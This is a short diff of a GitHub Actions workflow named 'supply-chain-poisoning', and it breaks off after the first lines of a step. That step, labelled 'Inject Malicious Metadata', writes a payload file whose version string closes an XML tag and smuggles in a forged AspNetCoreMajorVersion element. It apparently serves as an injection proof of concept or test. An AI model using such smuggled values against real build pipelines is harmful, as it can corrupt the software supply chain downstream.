@@ -7,12 +7,12 @@ jobs:
   supply-chain-poisoning:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: "Clone Repository"
+        uses: actions/checkout@v4
 
       - name: "Inject Malicious Metadata"
         id: metadata
-        # Elite Trick: Hum payload ko ek ENV block ke andar define kar rahe hain
-        # jisse shell ko koi quote parsing karni hi nahi padegi.
         run: |
+          # Creating the payload file
           cat << 'EOF' > payload.txt
           1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
